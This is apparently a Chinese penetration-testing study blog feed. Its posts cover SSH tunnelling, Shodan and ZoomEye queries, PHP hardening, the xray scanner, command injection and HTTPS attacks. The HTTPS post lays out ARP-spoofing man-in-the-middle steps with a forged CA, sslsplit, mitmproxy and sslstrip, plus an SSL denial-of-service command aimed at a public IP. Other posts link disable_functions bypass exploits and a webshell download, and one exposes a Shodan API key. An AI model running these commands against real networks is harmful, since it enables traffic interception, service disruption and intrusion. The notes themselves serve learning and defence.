SSH隧道通过ssh隧道，封装一些其他的服务数据，保证安全性 登录123456789ssh xps@192.168.0.10# 登录之后，不进入shell界面（只是获得会话后运行一个命令，但效果是一样的） -- 命令服务端去ping另外一台机器# -i指定私钥，-p指定端口ssh -i ~/.ssh/id_main ssh xps@192.168.0.10 -p 2222 ping 192.168.0.1# (cstream -t限制传输速度通信带宽)拷贝文件夹到目标机器（本地打包, 在服务端解包），pv显示带宽占用情况 # --- 企业用的网络带宽(质量好)比家用的成本很贵tar -cj dir/ | pv |cstream -t 100k | ssh xps@192.168.0.10 'tar -xj' ssh隧道 – 实现远程映射1234567891011121314###### 端口映射（两个机器之间，添加一个加密的管道 来连接）# 映射远程端口23到本机2001端口#（-f端口转发,-N不占用命令行窗口, -L侦听本机的端口，localhost理解为隧道，23为目标机器端口，最后是目标机器ip）ssh -fN -L2001:localhost:23 xps@192.168.0.10 # 现在，telnet本机的2001端口，就相当于通过机密的隧道来映射到目标的23端口# 其他类型的服务也可以封装...### 拓展：远程映射# 隧道的起点：我的机器，隧道的终点：'另外机器'。然后通过'另外机器',访问目标机器(sina)# 本机的2002端口，通过ssh隧道，映射到'另外机器'(世界上随便一个机器)的ip的80端口，# 用途：内网特殊的服务器运行访问外网(进行映射)，就能突破对内容不能上网的限制# 限制：一对一，针对的外网的某一台（提高：一个端口访问外网所有资源，自己找资料）ssh -fN -L2002:123.206.96.26:80 xps@192.168.0.10 # 再telnet 127.0.0.1:2002,就是达到了访问123.206.96.26的80端口的目的(最后的ip只是建立隧道,类似中间的一个) ssh隧道 – 实现文件系统挂载比如，一开机，就自动把远程机器的目录/分区挂载到我本机上，跟访问本地目录一样的效果 123456789101112## ssh隧道实现文件系统的挂载# 第一个ip的要挂载的远程机器，后面的本机目录sshfs xps@192.168.0.10:home/test /mnt/myfiles # 远程挂载远程机器目录到本地# 再查看，会发现本地目录多了远程服务器目录的文件（如果网络带宽不够，性能和体验就比较差）# 在客户端/服务端对文件进行操作，都是可以的umount /mnt/myfiles # 卸载1fusermount -u /mnt/myfiles # 卸载2#配置文件使用持久化挂载 vim /etc/fstabuser1@192.168.0.10:/path /mntpotin fuse,sshfs, rw,noauto,user,_netdev0# 目标机器的路径，本机的挂载点 SSH客户端若要管理的服务器的数目众多，对每台服务器做一个方便记忆的标签，简化登录 在本机(客户端)创建一个客户端配置文件：~/.ssh/config内容1234567891011121314host server1 # 别名随意 Hostname 192.168.1.10 # 对应主机ip，端口，用户名 Port 22 User xps host db2 Hostname 192.168.1.10 Port 22 User xps host mail1 Hostname 192.168.1.10 Port 22 User xps 以后登录的话，直接：12# 直接登录别名即可(不仅方便，还隐藏了ip，更加安全)ssh db1 SSH安全SSH防爆破密码爆破防护 方法：监视：次数太多就禁止该ip访问 借助fail2ban来实现:fail2ban原理：周期性的检查登录日志，对异常的ip进行屏蔽(调用防火墙实现)1234567891011121314151617181920212223242526272829303132333435363738394041# 安装apt install fail2ban# 默认主配置文件，软件更新时被覆盖(`所以一般不会使用它`) jail --&gt; 监狱/etc/fail2ban/jail.conf# 本地配置文件，软件更新不被覆盖，优先级更高（`一般常修改这个文件`） 复制一份：cp jail.conf jail.local/etc/fail2ban/jail.local#配置项(一般只需配置几项)#1.全局的：ignoreip=127.0.0.1/8 19.168.0.10 # 忽略并不进行监视的地址（受信的ip地址段）bantime=-1 # 禁用的时间(单位是s)， -1是永远屏蔽findtime=1 # 查询间隔时间maxretry=5 # 连着失败输入多少次密码，我就屏蔽你#2.Actions: 有异常做什么动作(比如报警邮件，默认是防火墙屏蔽)#3.Jails设置：针对不同类型的服务(并不仅限于ssh服务)，配置不同的（这里的优先级比全局配置项高） [sshd] ecabled=true # 启用对ssh的jails filter=sshd # 查找的关键词 logpath = xxxxxx.log # 以ssh服务为例(见下图)# 重启服务生效 sudo systemctl restart fail2ban.service# 查看身份认证日志文件tail -f /var/log/auth.log# 查看jail列表(都有哪些jail，jail的情况)sudo fail2ban -client statussudo fail2ban -client status sshd # 查看ssh的jail的详细信息# 查看防火墙规则sudo iptables -Ssudo iptables -L -n# 手动解除被禁IPsudo iptables -D f2b-sshd-s 192.168.1.111 -j REJECT # 通过删除防火墙某一个规则 -D, REJECT或DROP看自己的情况sudo fail2ban-client set sshd unbanip 192.168.1.8# 手动解除禁用之后，但是如果重启服务，会再自动查看日志：还没有超过被禁期限的ip会再次被禁 VNC服务 这里只介绍vnc，还有其他更优秀的工具，但是vnc的适用范围最广 图形化界面（类似于windows下的远程桌面） 使用图形化界面及工具 是Linux系统最通用的远程图形管理工具（通用适用于windows） 安装图形环境1234567#这里安装简化版的xfce4桌面环境，这里选择vnc的一个软件包:tightvncserver. 也可以自己选择别的版本的sudo apt install gnome-core xfce4 xfce4-goodies tightvncserver# 一个vnc可以启动多个侦听端口(默认从5901开始)，从不同端口连接，打开不同会话(每个用户看到的桌面是不一样的)# 若只侦听一个端口，通过一个端口连接，多个用户看到的都是一个桌面# 建议：多用户，在每一个不同权限的用户下(su进去，运行启动实例)，这样不同用户连接就是不同的桌面了 运行配置12345678910111213141516171819vncserver # 启动vnc服务（接下来会让你输入连接密码和只读密码）~/.vnc/xstartup # 会生成运行文件vncserver -kill:1 # 删掉自动生成的实例（因为不一定最适合我们的桌面环境。冒号后面是1是5901,如果是2就是5902）# 备份一下文件mv xstartup xstartup.bak# 创建新运行文件， 手动配置适合我们xfce4的vnc配置vim xstartup #!/bin/bash xrdb $HOME/.Xresources startxfce4 &amp;# 修改权限chmod +x ~/.vnc/xstartup# 重新运行vncserver # tcp的5901端口# 就可以在客户端用客户端软件连接了(比如：Remote Desktop Viewer) 输入ip:端口# Note: 服务器上，能少开端口就少开端口，能少开服务就少开服务 多用户12345678910111213# 每个用户不用会话# 在每一个不同权限的用户下(su进去，运行启动实例)，这样不同用户连接就是不同的桌面了su newuser1vncserver~/.vnc/xstartup vncserver -kill:2vim xstartup #!/bin/bash xrdb $HOME/.Xresources startxfce4 &amp; chmod +x ~/.vnc/xstartupvncserver :2 # tcp的5902端口 ps: vnc的加密强度不是很高，所以：在不需要vnc的时候，建议杀掉vnc进程(vncserver -kill:2) 因为 vnc的加密强度没有ssh高，所以，尝试：先建立ssh隧道，再在隧道的基础上建立图形化的连接 PUPPET也是一个远程管理工具，可以不登录到被管理服务器上利用puppet的服务端(我的机器)来管理puppet的客户端(安装在远程服务器上)，进行批量管理… 全生命周期的远程管理方案 软件安装部署(可以写一个脚本，然后批量下发给安装有puppet客户端的服务器上) 权限设置 账号管理 支持云平台 支持容器(Docker) 适合大量服务器管理 准备1234567891011# 这里以两台机器做实验# 为了区分，改一下两台计算机名hostnamectrl set-hostname puppethostnamectrl set-hostname client# 修改hosts文件，修改解析域名(这个随便起) -- 两台机器都要修改vim /etv/hosts 192.168.1.10 puppet.lab.com puppet 192.168.1.11 client.lab.com client # 其他行都删掉就行 # 可以在dns服务器上修改，这里通过hosts修改域名解析只是权宜之计(下一章学完DNS之后就在dns服务器修改域名的解析) 安装12345# 安装puppet服务端程序sudo apt install puppetmaster # 安装puppet客户端程序sudo apt install puppet 配置服务端配置-11234567891011121314151617cd /etc/puppetsudo mkdir -p modules/apache2/manifests # manifests 目录下面就是资源文件touch init.pp# sudo vim /etc/puppet/modules/apache2/manifests/init.pp# 比如要给下面的机器安装apache, # 一组资源就是一个类class apache2&#123; package&#123;'apache2': # 软件包 ensure=&gt;installeds, &#125; service&#123;'apache2': # apache的服务是否启动 ensure=&gt;ture, ensure=&gt;ture, require=&gt;Package['apache2'], # 包的名称 &#125;&#125; 服务端配置-212345678910111213# 上面的配置文件定义了资源，那么这里确定要给哪些服务器安装哪个资源# 选择哪个资源cd manifeststouch site.pp# sudo vim /etc/puppet/manifests/site.pp# 解析这个节点(通过域名解析到对应ip,只要那些计算机在这个域名即可)node 'client.lab.com' &#123; include apache2 # 选择下发哪些资源。这里以推送apache2资源为例&#125;# 重启服务systemctl restart puppetmaster.service 客户端配置1234567# puppet的客户端和服务端是通过证书来通信等操作的# sudo vim /etc/default/puppet 默认没有，自己新建 START=yes# 重启服务（会自动向puppet服务端发起请求申请证书）systemctl restart puppet.service 客户端证书前面请求测试1234# 在查看客户端的指纹信息sudo puppet agent --figerprint# 服务端下面下发证书后，然后在客户端测试一下，获取证书sudo puppet agent --test 服务端请求查看签名123456# 在服务端查看哪些客户端跟我发起证书请求了sudo puppet cert list# 在服务端使用自己的私钥给对应的机器进行签名(sign)sudo puppet cert sign client.lab.com# 客户端查看证书下发进度： sudo puppet agent --test 完成上面的步骤(资源的下发配置，证书的请求与签名下发，重启服务)之后，在客户端查看apache2的服务已经安装好并启用了 日志状态信息查看1234# 查看状态systemctl status puppet.service/var/log/syslog 上面关于puppet只是简单的一小部分，后续高级用法，请自行探索]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
        <tag>远程管理</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[黑暗引擎]]></title>
    <url>%2F%E9%BB%91%E6%9A%97%E5%BC%95%E6%93%8E%2F</url>
    <content type="text"><![CDATA[一. shodan1.简单介绍Shodan，是一个暗黑系的谷歌，作为一个针对网络设备的搜索引擎，它可以在极短的时间内在全球设备中搜索到你想找的设备信息。对于渗透工作者来说，就是一个辅助我们寻找靶机的好助手。 2.内置语法123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657# Shodan的参数有很多，这里只介绍简单的几种hostname："主机或域名"如 hostname:"google''port："端口或服务"如 port:"21"ip : "ip地址"如 ip : "168.205.71.64"net："IP地址或子网"如 net:"210.45.240.0/24"vuln :指定漏洞的cve如 vuln:CVE-2015-8869但是这个命令最好搭配起来使用，如 country:CN vuln:CVE-2014-0160os :"操作系统"​ 如 os:"centOS"isp："ISP供应商"如 isp:"China Telecom"product："操作系统/软件/平台"如 product:"Apache httpd"version："软件版本"如 version:"3.1.6"geo："经纬度"如 geo:"39.8779,116.4550"country`："国家"如 country:"China"country:"UN"city："城市"如 city:"Hefei"org："组织或公司"如 org:"google"before/after："日/月/年"如 before:"25/09/2017"after:"25/09/2017"asn : "自治系统号码"如 asn:"AS2233" 3.脚本使用 （建议使用本地脚本，也可自主开发）项目地址：https://github.com/achillean/shodan-python 先clone, python setup.py install, shodan init 秘钥_value,然后可以在命令行用了就shodan search product:&quot;apache&quot; 只不过显示方式不友好 拓展：自主开发 官方文档：https://shodan.readthedocs.io/en/latest/index.html 123456789101112131415from shodan import Shodanapi = Shodan("cUNKhp6cIaN7J4Y9hXnBtbtT8bd9SKCf")# Lookup an IPipinfo = api.host('8.8.8.8')print(ipinfo)# Search for websites that have been "hacked"for banner in api.search_cursor('ch1_http相关.title:"hacked by"'): print(banner)# Get the total number of industrial control systems services on the Internetics_services = api.count('tag:ics')print('Industrial Control Systems: &#123;&#125;'.format(ics_services['total'])) 案例测试：1.phpstudy采集头部信息 Server: Apache/2.4.23 (Win32) OpenSSL/1.0.2j mod_fcgid/2.3.9 2.子域名信息采集hostname:&quot;xps.cn&quot; 3.特定漏洞靶机采集vuln:CVE-2020-1983 普通用户没权限用 二. zoomeye 对国内更贴近一些 内置语法ZoomEye搜索技巧 指定搜索的组件以及版本 app：组件名称 ver：组件版本 例如：搜索 apache组件 版本2.4 app:apache ver:2.4 指定搜索的端口 port:端口号 例如：搜索开放了SSH端口的主机 port:22 一些服务器可能监听了非标准的端口。 要按照更精确的协议进行检索，可以使用service进行过滤。 指定搜索的操作系统 OS:操作系统名称 例如：搜索Linux操作系统 OS：Linux 指定搜索的服务 service：服务名称 例如，搜素SSH服务 Service：SSH 指定搜索的地理位置范 country：国家 city：城市名 例如： country:China city：Beijing 搜索指定的CIDR网段 CIDR:网段区域 例如： CIDR：192.168.158.12/24 搜索指定的网站域名 Site:网站域名 例如： site:www.baidu.com 搜索指定的主机名 Hostname:主机名 例如： hostname:zwl.cuit.edu.cn 搜索指定的设备名 Device：设备名 例如： device:router 搜索具有特定首页关键词的主机 Keyword：关键词 例如： keyword:technology 脚本开发(多语言开发)官方手册:https://www.zoomeye.org/doc 1.登录授权2.请求搜索3.回显数据 补充：谷歌黑客高级玩法https://www.uedbox.com/shdb/ https://www.uedbox.com/post/54776/]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑暗引擎</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP常见安全设置]]></title>
    <url>%2FPHP%E5%B8%B8%E8%A7%81%E5%AE%89%E5%85%A8%E8%AE%BE%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[PHP.INI与WEB安全四种防护1.magic_quotes_gpc魔术引号：过滤转义四种字符（），对于sql注入有过滤作用 绕过： 特定条件下可以尝试宽字节注入 2.safe_mod 安全模式，官方自带的 安全模式： 禁止php中敏感函数，防御提权及后门调用，漏洞利用一些敏感函数被禁用 有时候不开安全模式的原因：自己开发中也需要使用到某些敏感函数，不然影响正常应用 3.open_basedir启用之后： open_basedir=D:\phpstudy\PHPTutorial\WWW`限制后门的访问指定目录（菜刀连上也看不到目录里面） 没办法绕过 4.disable_function可自定义禁用函数：安全模式(safe_mod)升级版，可自定义函数禁用，更加灵活 1dl, exec, system, passthru, popen, proc_open, pcntl_exec, shell_exec, mail, imap_open, imap_mail, putenv, ini_set, apache_setenv, symlink, link 举例： 12disable_function = eval,system,fopen,fread,readdir,init_set //比如禁用某指定函数的做法// 可以直接封杀大马小马等后门disable_functiondisable_function 绕过disable_function的突破: 方法1：蚁剑及插件(绕过disable_function)使用, 加载插件插件会保存到antData/plugin目录现在好像已经不用自己下载这个插件了 参考文章: https://www.cnblogs.com/linuxsec/articles/10966675.html 方法2： 针对php7.x:（不支持windows）https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php 方法3： 脚本集合：https://github.com/l3m0n/Bypass_Disable_functions_Shellhttp://webshell8.com/down/phpwebshell.zip 方法4：一些webshell自带绕过功能 其他目录权限文件解析 … …]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>php.ini</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[xray简单学习]]></title>
    <url>%2Fxray%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[xray学习平时使用webscan是最多的 结合基础爬虫 123xray.exe webscan --basic-crawler http://xxxxx# 有弊端（爬虫是不受我们控制的。如果是代理就行了:我们点哪里就扫哪里） 基本使用代理原理 设置代理步骤 其中，证书的生成(只要程序位置不变，证书就不需要重新安装)：ca.crt, 然后安装证书 生成报告后(可以边扫边看)，点击对应条目，我们可以看到具体的请求/响应信息等 高级用法1.常用配置 配置文件：config.yaml 允许扫描的域 Mitm -&gt; Restriction默认会把所有流量扫描，可以指定我们想要扫描的域名的流量includes允许扫描的域，*表示任意；excludes不允许扫描的域 为代理添加认证 Mitm -&gt;auth如果把xray放到公网上，别人也可以使用，我们就需要设置账号密码 扫描插件配置 Plugins插件可以打开(enable:true)和关闭(false),也可以自定义字典等或者直接在命令行指定启用哪些插件：--plugins xss,xxe 发包速率限制 http -&gt; max_qps限制扫描速度，防止被waf拉黑 扫描代理配置 http -&gt; proxy代理支持以下形式 1234567#1.http代理http: proxy: &quot;http://127.0.0.1:8080&quot; # 漏洞扫描时使用的代理#2.socks代理http: proxy: &quot;socks5://127.0.0.1:1111&quot; # 漏洞扫描时使用的代理 log如果改成debug，可以看到具体发包请求详情： 也可以设置cookie 大致配置项： 2.xray与burp联动使用（1）Burpsuite作为xray的上游代理（抓取xray发包来学习） 作用：burp可以拿到xray的数据包（可以学习xray是如何检测的的） 设置方法： xray设置代理: http://127.0.0.1:8080 burp监听8080端口 启动xray，设置监听端口为--listen 127.0.0.1:1111 浏览器配置代理为1111 （2）xray作为Burpsuite的上游代理（协助测试） 作用：burp可以选择是否放行，forward之后，可以用xray进行扫描 设置方法： xray配置文件不配置代理 burp正常设置监听8080端口 burp打开user option -&gt; Upstream Proxy Server -&gt; 添加为:127.0.0.1:1111 浏览器设置burp代理8080 启动xray，设置监听端口为--listen 127.0.0.1:1111 其他方式：使用插件 使用xray编写自定义pocxray是用go语言开发的poc是yaml格式的 原理 每个规则都是http请求，进行改造 POC构成 name rules：最关键部分。请求方法,路径,表达式(有唯一的返回值)。支持多条(就会发送几条数据包) details：漏洞检测成功之后，输出一些提示信息 具体操作 看官方文档 vscode和jetBrain都行 vscode安装YAML查看，配置文件setting.json用来校验 按照上面的格式编写 运行：xray.exe webscan --plugins phantasm --poc ./poc-yaml-test.yml --listen 127.0.0.1:1111 对单个url扫描：--url http://www.test.com 更好用 Note: phantasm这里是在命令行启用 详细内容查看官方文档 调试poc的方法：设置上游代理为burp，在burp查看xray发送的数据包]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>xray</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[常见的管道符]]></title>
    <url>%2F%E5%B8%B8%E8%A7%81%E7%9A%84%E7%AE%A1%E9%81%93%E7%AC%A6%2F</url>
    <content type="text"><![CDATA[常见的管道符：Windows：| 直接执行后面的语句|| 如果前面出错（即为false），就执行后面的语句（前面只能为假）&amp; 如果前面的语句为假则直接执行后面的语句（前面可真可假）&amp;&amp; 如果前面的语句为假，则直接出错，且不执行后面的语句（前面只能为真） Linux：; 执行完前面再执行后面| 显示后面语句的执行结果|| 前面语句出错时，执行后面的语句&amp; 如果前面的语句为假则直接执行后面的语句（前面可真可假）&amp;&amp; 如果前面的语句为假，则直接出错，且不执行后面的语句（前面只能为真） 命令执行简介程序如果提供执行 命令的功能比如提供了ping的功能： 输入 ping | dir, 利用了管道符执行了dir php中常见的执行系统 命令的函数： 1system, exec, shell_exec, passthru, popen, proc_popen 修复建议 尽量不要使用系统命令执行函数 对客户端提交的变量进行过滤和检测 使用动态函数之前，确保使用的函数是置顶的函数之一 对php来说，不能完全控制的危险函数最好不要使用]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>常见的管道符</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTPS攻击]]></title>
    <url>%2FHTTPS%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[HTTPS攻击防止恶意注入、DNS劫持 https的作用 C I A 解决的是信息传输过程中数据被篡改、窃取 加密：对称、非对称、单向(Hash) https攻击方法 降级攻击 解密攻击（明文、证书伪造）– 劫持 协议漏洞、实现方法的漏洞、配置不严格 常识SSL（安全套接层, Secure socket layer）,后来使用TSL取代了SSL，只不过习惯了叫SSL SSL/TLS也被用于其他场景的传输通道加密： 邮件传输（服务器间、客户端与服务器间） 数据库服务器间 LDAP身份认证服务器间 SSL VPN 远程桌面RDP通信过程中的加密和身份认证 Web通信中SSL加密 公钥证书（受信任的第三方证书颁发机构签名颁发） 常见的证书颁发机构：VeriSign、Thawte、GlobalSign、Symantec 加密过程：握手、协商加密算法、获取公钥证书、交换会话秘钥、加密信息传输 非对称加密算法 非对称加密一般用来加密比较小的数据例如：RSA, ECC等 对称加密算法 DES/3DES, AES, IDEA, RC4 …… 单向加密算法(Hash) Hash算法 Hash值长度(bit) MD5 128 SHA-1 160 SHA-2 224,256,384,512 SSL的弱点 SSL是不同的对称、非对称、单项加密算法的组合加密实现(cipher suite) 服务器端为提供更好的兼容性，选择支持大量过时cipher suite 协商过程中墙皮降级加密强度 现代处理器计算能力可以在可接受的时间内破解过时加密算法 购买云计算资源破解 实践 查看web站点用了啥样的ssl协议，什么版本，什么组合 1.openssl命令123456789101112131415openssl s_client --connect www.baidu.com:443#证书颁发机构也是树形结构的，有一级二级#指定查看是否支持某协议和组合openssl s_client -tls1_2 -cipher 'ECDHE-ECDSA-AES128-GCM-SHA256' -connect www.taobao.com:443# 测试是否可以跟已知的不安全的cipher suite建立连接openssl s_client -tls1_2 -cipher 'NULL,EXPORT,LOW,DES' -connect www.taobao.com:443# 已知的不安全的组合cipher suiteopenssl ciphers -v 'NULL,EXPORT,LOW,DES'# 参考网站（加密技术）https://www.openssl.org/docs/apps/ciphers.html Openssl需要大量密码学相关知识，命令复杂，结果可读性差 2.SSLScan工具 自动识别ssl配置错误、过期协议、过时cipher suite和hash算法 默认会检查CRIME、心脏出血漏洞 绿色表示安全，红色黄色需要引起注意 查看TLS支持的cipher suite 1234# 检查所有的支持的tls是否有不安全的sslscan --tlsall www.taobao.com:443# Altnames选项下面的域名也可以使用上面域名的证书 分析证书详细信息1sslscan --show-certificate -no-ciphersuites www.taobao.com:443 3.SSLyze工具 Python编写 检查ssl过时版本 检查存在弱点的cipher suite 扫描多站点时，支持来源文件(多个站点放到一个文件里面) 检查是否支持会话恢复 1sslyze --regular www.supercomputerboytony.cn 4.Nmap12# 枚举cipher suitenmap --script=ssl-enum-ciphers.nse www.supercomputerboytony.cn 5. 在线网站：输入域名，对SSL进行检测https://www.ssllabs.com/ssltest SSL中间人攻击概述攻击者位于客户端和服务器通信链路中 1.ARP欺骗（最常用） 2.DHCP如果有另一台机器，比之前的dhcp服务器离用户更近，那么攻击者的机器就会更快响应(DHCP第一步是广播) 3.修改网关 4.修改DNS(如果控制了客户机, 直接修改客户机的dns配置) 5.修改HOSTS 6.ICMP、STP(二层的生成树协议)、OSPF(三层的开放式最短路径优先协议) —&gt;如果处在同一局域网 不仅是http和tcp/ip协议容易出现安全问题，底层的网络协议也存在很多问题，自己搭建环境练习 加密流量 ps：下来的演示，是基于ARP欺骗的： 利用攻击的前提 客户端已经信任了伪造证书颁发机构 攻击者控制了核发证书颁发机构（CA证书服务器） 客户端程序禁止了显示证书错误告警信息 攻击者已经控制客户端，并强制其信任伪造证书 工具对已经实现中间人欺骗(这里用arpspoof)后，下面的工具对信息进行解密 1.SSLsplit工具 透明SSL/TLS中间人攻击工具 对客户端伪装成服务器，对服务器伪装成普通客户端 伪装服务器需要伪造证书（利用openssl来生成伪造的证书） 支持ssl/tls加密的smtp、pop3、ftp等通信中间人攻击 1). openssl 1234567# 1.利用openssl生成证书私钥openssl genrsa -out ca.key 2048# 2.利用私钥签名生成证书(生效时间,使用的私钥文件) -- 这是根证书，不是一会使用的证书，用的证书是需要这个根证书来签名的openssl req -new -x509 -days 1096 -key ca.key -out ca.crt# 下来输入一些信息即可（信息可以把之前扫描的信息添进来以保证看起来很真实） 2).攻击机器设置路由转发下面，当受害者的流量通过我的机器，我的机器来转发（需要我的系统来开启路由功能）： 做个地址转换, 比如: 把我计算机443端口收到的数据包转发到8443端口 12345678910111213141516171819# 先查看要用到的端口有没有被占用netstst -pantu |grep :80# 查看nat表iptables -t nat -L# -F 清空iptables -t nat -F# 端口转发命令（PREROUTING在路由之前,-p协议, -j操作）iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIFECT --to-port 8080iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIFECT --to-port 8443iptables -t nat -A PREROUTING -p tcp --dport 587 -j REDIFECT --to-port 8443 # MSAiptables -t nat -A PREROUTING -p tcp --dport 465 -j REDIFECT --to-port 8443 # SMTPS 发邮件iptables -t nat -A PREROUTING -p tcp --dport 993 -j REDIFECT --to-port 8443 # IMAPS 收邮件iptables -t nat -A PREROUTING -p tcp --dport 995 -j REDIFECT --to-port 8443 #POP3S#其他使用ssl协议加密的协议端口一样iptables -L 3).ARP欺骗1234# -i本地网卡 -t要欺骗的目标， -r:让他认为网关192.168.1.1的mac地址是我本机的mac地址arpspoof -i eth0 -t 192.168.1.118 -r 192.168.1.1#可以发现：受害者机器上关于网关的mac已经换成了kali的 4).启动SSLsplit123456mkdir -p test/logdir# -D:debug显示详细信息，-l把连接信息记录到哪，-j“越狱”的根目录(sslsplit的)，-S请求具体数据内容保存的目录，-k私钥，-c证书；对ssl加密的在本地8443监听,对明文在本地8080监听sslsplit -D -l connect.log -j /root/test -S logdir/ -k ca.key -c ca.crt ssl 0.0.0.0 8443 tcp 0.0.0.0 8080# 所有操作完成了 然后让被害者访问https的一些网站(会显示证书有问题,是否继续浏览) 我们可以查看日志和浏览器证书以及证书保存信息(cat connect.log) , 具体通信数据在:ls test/logdir, 每个log文件中内容会有被解密的明文信息（如果还有加密信息,那就是应用程序本身进行了加密的，这里的解密的只是通信过程中针对ssl部分）通过关键词查找内容：grep xxx *.log这样 在受害者机器上安装我们生成的服务器根证书之后再次访问(浏览器就不会弹出警告了) 全站https/非全站https（比如只是登录等部分页面加了https） 2.Mitmproxy工具 设置路由表转发规则 12345# bug: 只能在8080端口监听，所以需要修改规则iptables -t nat -Fiptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIFECT --to-port 8080iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIFECT --to-port 8080 也是使用arpspoof进行arp欺骗 1arpspoof -i eth0 -t 192.168.1.118 -r 192.168.1.1 最后，Mitmproxy侦听 123mitmproxy -T --host -w mitmproxy.log# mitmproxy会自动生成一个证书 3.SSLstrip工具与前两种工具不同，此工具将客户端到中间人之间的流量变为明文(不用通过安装证书)12# 这种更实用便捷，但是......sslstrip -l 8080 SSL/TLS拒绝服务攻击 和流量式的拒绝服务攻击不同(打击的是网络带宽)，而我们这里打击的是服务器的资源 Note: SSL协商加密，服务器资源加载速度会变慢（大量握手请求会导致拒绝服务），但是优化得当就可以没问题 利用SSL secure Renegotiation特性，在单一TCP连接中生成数千个SSL重连接请求，造成服务器资源过载 与流量式的拒绝服务攻击不同，thc-ssl-dos可利用dsl线路打垮30G带宽的服务器 服务器平均可以处理300次/s SSL握手请求 利用thc-ssl-dos工具12#使用thc-ssl-dos 199.223.209.205 2083 -accept dig命令，解析ip地址 补充概念AjaxAsynchronous JavaScript and XML 是一组现有技术的组合 通过客户端脚本动态更新页面部分内容，而非整个页面 降低带宽使用，提高速度 提升用户体验 后台异步访问 Ajax组件 JavaScript(ajax的核心组件) Dynamic HTML(DHTML) DOM ajax框架： jQuery Dojo Tookit Google Web toolkit Microsoft Ajax library 基于Ajax的Web应用工作流程 使用的技术混合越多，攻击面就越大(每个参数都可能形成独立的攻击过程) Ajax的安全问题 多种技术混合，攻击面就越大(每个参数都可能形成独立的攻击过程) Ajax引擎，访问恶意站点可能后果严重，虽然浏览器有沙箱和SOP，但可能被绕过 服务器、客户端代码结合使用产生混乱，服务器访问控制不当，将信息泄露 暴露应用程序逻辑 Ajax对渗透测试的挑战 异步请求数量多且隐蔽 触发Ajax请求的条件无规律 手动和阶段大力爬网可能产生大量遗漏 检查方法： 手动查看页面源代码有没有使用ajax（效率低一些） 浏览器打开审查元素：net –&gt; XHR / net –&gt; javascript 使用ZAP，使用ajax爬站功能 Web Service 面向服务的架构，便于不同系统集成共享数据和功能 尤其适合不想暴露数据模型和程序逻辑而访问数据的场景 无页面 两种类型： SOAP （传统，xml是唯一的数据交换格式，繁琐，但是安全） – Simple object access protocol RESTful (json是首选的数据交换格式刷) web service安全考虑： 使用API key或session token实现和跟踪身份认证 身份认证由服务器完成，而非客户端 API key, 用户名, Session token 永远不要通过URL发送 RESTful 不提供任何安全机制，需要使用SSL/TLS保护传输数据安全 SOAP提供强于HTTPS的WS-security机制 使用OAuth或HMAC进行身份验证，HMAC身份认证使用C/S共享的秘钥加密API key RESTful应只允许身份认证用户使用PUT、DELETE方法 使用所及token防止CSRF攻击 对用户提交参数过滤，建议部署基于严格白名单的方法 报错信息消毒 直接对象引用应严格身份验证(电商公司以ID作为主索引)]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>HTTPS攻击</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Node.js 入门]]></title>
    <url>%2FNode-js-%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[Node.js是一个机遇Chrome V8引擎的JavaScript运行环境 Node.js的包管理器npm，是全球最大的开源生态库系统 Node.js可解析js代码，没有浏览器安全级别的限制 一.开发环境配置官网： https://nodejs.org/en/ API文档：http://nodejs.cn/api/events.html 如果需要安装多个版本1).docker 2).使用nvm来安装并维护（推荐） 项目地址：https://github.com/nvm-sh/nvm 123456789# 1.安装nvmcurl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.35.3/install.sh | bash# 2.配置环境变量#linux下 .bash_profile或.bash_rcexport NVM_DIR="$([ -z "$&#123;XDG_CONFIG_HOME-&#125;" ] &amp;&amp; printf %s "$&#123;HOME&#125;/.nvm" || printf %s "$&#123;XDG_CONFIG_HOME&#125;/nvm")"[ -s "$NVM_DIR/nvm.sh" ] &amp;&amp; \. "$NVM_DIR/nvm.sh" # This loads nvm# windows系统。。。 3.配置加速镜像： 12# 同样在上面的配置文件export NVM_NODEJS_ORG_MIRROR=http://npm.taobao.org/mirrors/node 安装node1234567891011121314151617# 安装指定版本nvm install 8.0.0# 或安装最新的稳定版本nvm install --lts# 或安装最新的版本nvm install node# 查看安装的版本nvm ls# 查看当前版本node -v# 切换版本nvm use 6.11.2 体验一下在终端进入node命令行：node, 之后可以输入js代码了 在终端里面，不用受到浏览器里面的一些限制(但是本地环境没有dom和bom的操作) 比如，查看本地进程process 执行文件：node index.js 不用每次写完都运行命令来执行安装nodemon, 实时侦测文件的变化 1npm install nodemon -g # 全局安装 npm使用国内源： 12# 永久npm config set registry https://registry.npm.taobao.org 或安装使用cnpm命令 使用nodemon： 12nodemon index.js# 这样就可以实时侦测了 使用其他版本node来运行脚本 123456789101112# 1.指定版本来运行nvm run 6.1.2 index.js#2.使用配置文件.nvmrc #内容直接写版本号，6.1.2#nmp use#接下来运行就可以了node index.js 二. 模块(包)与CommonJS Node.js三种模块 内置的Node.js模块 12const os = require('os') // require 载入模块console.log(os.hostname()); // 